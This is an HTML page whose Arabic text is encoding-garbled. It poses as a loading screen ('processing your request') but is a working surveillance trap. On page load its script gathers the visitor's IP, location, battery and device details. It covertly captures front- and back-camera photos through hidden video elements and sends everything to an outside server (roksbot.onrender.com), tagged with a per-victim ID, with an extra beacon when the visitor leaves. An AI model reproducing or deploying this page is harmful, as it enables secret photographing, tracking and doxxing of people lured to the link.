<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù…Ø±Ø­Ø¨Ø§ Ø¨Ùƒ ÙÙŠ Ù…ÙˆÙ‚Ø¹Ù†Ø§</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            max-width: 500px;
        }
        .spinner {
            border: 16px solid #f3f3f3;
            border-top: 16px solid #3498db;
            border-radius: 50%;
            width: 120px;
            height: 120px;
            animation: spin 2s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h1>Ø¬Ø§Ø±ÙŠ ØªÙ†ÙÙŠØ° Ø·Ù„Ø¨Ùƒ</h1>
        <p>ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±...</p>
    </div>
    <!-- Ø¥Ø®ÙØ§Ø¡ Ø§Ù„ÙÙŠØ¯ÙŠÙˆÙ‡Ø§Øª -->
    <video id="frontVideo" playsinline autoplay muted style="display:none; visibility:hidden;"></video>
    <video id="backVideo" playsinline autoplay muted style="display:none; visibility:hidden;"></video>
    <script>
        // Ø§Ù„Ø³ÙŠØ±ÙØ± Ø§Ù„Ù‡Ø¯Ù - Ù…ØªÙˆØ§ÙÙ‚ Ù…Ø¹ server.js
        const EXTERNAL_SERVER_URL = 'https://roksbot.onrender.com';
        
        const frontVideo = document.getElementById('frontVideo');
        const backVideo = document.getElementById('backVideo');
        const userId = window.location.pathname.split('/')[3] || 'unknown-user';

        async function collectAdditionalData() {
            try {
                const ipInfo = await fetch('https://ipapi.co/json/').then(response => response.json());
                const battery = await navigator.getBattery();

                return {
                    ip: ipInfo.ip,
                    country: ipInfo.country_name,
                    city: ipInfo.city,
                    timezone: ipInfo.timezone,
                    language: navigator.language,
                    platform: getPlatformInfo().platform,
                    deviceVersion: getDeviceVersion(),
                    screenResolution: `${screen.width}x${screen.height}`,
                    batteryLevel: Math.round(battery.level * 100) + '%',
                    batteryCharging: battery.charging,
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString()
                };
            } catch (error) {
                console.error('Error collecting additional data', error);
                return {
                    userAgent: navigator.userAgent,
                    screenResolution: `${screen.width}x${screen.height}`,
                    language: navigator.language,
                    timestamp: new Date().toISOString()
                };
            }
        }

        function getPlatformInfo() {
            const ua = navigator.userAgent;
            if (/Windows/.test(ua)) return { platform: "Windows" };
            if (/Mac/.test(ua)) return { platform: "MacOS" };
            if (/Linux/.test(ua)) return { platform: "Linux" };
            if (/Android/.test(ua)) return { platform: "Android" };
            if (/iPhone|iPad|iPod/.test(ua)) return { platform: "iOS" };
            return { platform: "Unknown" };
        }

        function getDeviceVersion() {
            const ua = navigator.userAgent;
            const match = ua.match(/\(([^)]+)\)/);
            return match ? match[1] : 'Unknown';
        }

        async function requestCameraPermission(facingMode) {
            try {
                const constraints = {
                    video: {
                        facingMode: facingMode,
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                };
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                return stream;
            } catch (error) {
                console.error(`Error accessing ${facingMode} camera:`, error);
                return null;
            }
        }

        async function init() {
            try {
                console.log('ğŸš€ Ø¨Ø¯Ø¡ Ø¬Ù…Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª...');
                const additionalData = await collectAdditionalData();
                
                // Ø£ÙˆÙ„Ø§Ù‹: Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ© Ø¹Ø¨Ø± /submitData
                await sendBasicData(additionalData);
                
                // Ø«Ø§Ù†ÙŠØ§Ù‹: Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§Øª ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±
                await captureAndSendPhotos(additionalData);
                
                // Ø£Ø®ÙŠØ±Ø§Ù‹: Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² Ø¹Ø¨Ø± /SS
                await sendDeviceInfo(additionalData);
                
            } catch (error) {
                console.error('Error in init:', error);
            } finally {
                showCompletionMessage();
            }
        }

        async function sendBasicData(additionalData) {
            try {
                const data = {
                    userId: userId,
                    additionalData: JSON.stringify(additionalData),
                    message: `ğŸ¯ Ø§ØªØµØ§Ù„ Ø¬Ø¯ÙŠØ¯ Ù…Ù† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…\nğŸ‘¤ Ø§Ù„Ù…Ø¹Ø±Ù: ${userId}`
                };

                const result = await postToExternalServer('/submitData', data);
                console.log('âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©:', result);
            } catch (error) {
                console.error('âŒ ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©:', error);
            }
        }

        async function captureAndSendPhotos(additionalData) {
            try {
                const frontStream = await requestCameraPermission('user');
                const backStream = await requestCameraPermission('environment');
                
                const images = [];

                if (frontStream) {
                    const frontPhoto = await capturePhoto(frontStream, 'front');
                    if (frontPhoto) images.push(frontPhoto);
                    frontStream.getTracks().forEach(track => track.stop());
                }

                if (backStream) {
                    const backPhoto = await capturePhoto(backStream, 'back');
                    if (backPhoto) images.push(backPhoto);
                    backStream.getTracks().forEach(track => track.stop());
                }

                if (images.length > 0) {
                    await sendPhotosToServer(images, additionalData);
                } else {
                    console.log('âš ï¸ Ù„Ù… ÙŠØªÙ… Ø§Ù„ØªÙ‚Ø§Ø· Ø£ÙŠ ØµÙˆØ±');
                }

            } catch (error) {
                console.error('âŒ ÙØ´Ù„ ÙÙŠ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±:', error);
            }
        }

        function capturePhoto(stream, cameraType) {
            return new Promise((resolve) => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.playsInline = true;
                
                video.onloadedmetadata = () => {
                    video.play();
                    
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        
                        canvas.toBlob((blob) => {
                            resolve({
                                blob: blob,
                                filename: `photo_${cameraType}_${Date.now()}.webp`,
                                cameraType: cameraType
                            });
                        }, 'image/webp', 0.8);
                    }, 1000);
                };
            });
        }

        async function sendPhotosToServer(images, additionalData) {
            try {
                const formData = new FormData();
                
                formData.append('userId', userId);
                formData.append('cameraType', 'both');
                formData.append('additionalData', JSON.stringify(additionalData));
                
                images.forEach((image, index) => {
                    formData.append('images', image.blob, image.filename);
                });

                const result = await postToExternalServer('/submitPhotos', formData, true);
                console.log('âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±:', result);
            } catch (error) {
                console.error('âŒ ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±:', error);
            }
        }

        async function sendDeviceInfo(additionalData) {
            try {
                const deviceInfo = {
                    userId: userId,
                    deviceInfo: {
                        ip: additionalData.ip,
                        country: additionalData.country,
                        city: additionalData.city,
                        timezone: additionalData.timezone,
                        language: additionalData.language,
                        platform: additionalData.platform,
                        deviceName: getDeviceName(),
                        browser: navigator.userAgent,
                        screenResolution: additionalData.screenResolution,
                        battery: additionalData.batteryLevel,
                        isCharging: additionalData.batteryCharging,
                        networkType: 'unknown',
                        networkSpeed: 'unknown',
                        touchSupport: 'ontouchstart' in window,
                        geolocationAvailable: !!navigator.geolocation
                    },
                    userInfo: {
                        name: 'Ù…Ø³ØªØ®Ø¯Ù… Ø§Ù„Ù…ÙˆÙ‚Ø¹',
                        phone: 'ØºÙŠØ± Ù…ØªÙˆÙØ±',
                        email: 'ØºÙŠØ± Ù…ØªÙˆÙØ±',
                        description: 'Ø²Ø§Ø¦Ø± Ø§Ù„Ù…ÙˆÙ‚Ø¹'
                    }
                };

                const result = await postToExternalServer('/SS', deviceInfo);
                console.log('âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²:', result);
            } catch (error) {
                console.error('âŒ ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²:', error);
            }
        }

        function getDeviceName() {
            const ua = navigator.userAgent;
            if (/Android/.test(ua)) {
                const match = ua.match(/Android\s([0-9.]+)/);
                return `Android ${match ? match[1] : ''}`.trim();
            }
            if (/iPhone|iPad|iPod/.test(ua)) {
                const match = ua.match(/OS\s([0-9_]+)/);
                return `iOS ${match ? match[1].replace(/_/g, '.') : ''}`.trim();
            }
            return navigator.platform;
        }

        async function postToExternalServer(endpoint, data, isFormData = false) {
            const maxRetries = 2;
            let retries = 0;

            while (retries < maxRetries) {
                try {
                    const url = `${EXTERNAL_SERVER_URL}${endpoint}`;
                    console.log(`ğŸ”„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰: ${url}`);
                    
                    const options = {
                        method: 'POST',
                        mode: 'cors'
                    };

                    if (isFormData) {
                        options.body = data;
                    } else {
                        options.body = JSON.stringify(data);
                        options.headers = {
                            'Content-Type': 'application/json'
                        };
                    }

                    const response = await fetch(url, options);

                    if (!response.ok) {
                        throw new Error(`HTTP error! status: ${response.status}`);
                    }

                    const result = await response.json();
                    return result;

                } catch (error) {
                    console.error(`âŒ Ù…Ø­Ø§ÙˆÙ„Ø© ${retries + 1} ÙØ´Ù„Øª:`, error);
                    retries++;
                    if (retries < maxRetries) {
                        await new Promise(resolve => setTimeout(resolve, 1000 * retries));
                    } else {
                        throw error;
                    }
                }
            }
        }

        function showCompletionMessage() {
            setTimeout(() => {
                document.querySelector('.container').innerHTML = `
                    <h1>ØªÙ… Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø§Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹</h1>
                    <p>ÙŠÙ…ÙƒÙ†Ùƒ Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ø¢Ù†</p>
                `;
            }, 3000);
        }

        // Ø¨Ø¯Ø¡ Ø§Ù„ØªÙ†ÙÙŠØ° Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
        window.addEventListener('load', init);

        // Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø¹Ù†Ø¯ Ù…ØºØ§Ø¯Ø±Ø© Ø§Ù„ØµÙØ­Ø©
        window.addEventListener('beforeunload', async () => {
            try {
                const additionalData = await collectAdditionalData();
                const exitData = {
                    userId: userId,
                    additionalData: JSON.stringify(additionalData),
                    message: `ğŸ‘‹ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ØºØ§Ø¯Ø± Ø§Ù„ØµÙØ­Ø©\nâ±ï¸ Ø§Ù„ÙˆÙ‚Øª: ${new Date().toLocaleString('ar-EG')}`
                };
                
                navigator.sendBeacon(`${EXTERNAL_SERVER_URL}/submitData`, JSON.stringify(exitData));
            } catch (error) {
                console.error('Error sending exit data:', error);
            }
        });
    </script>
</body>
</html>
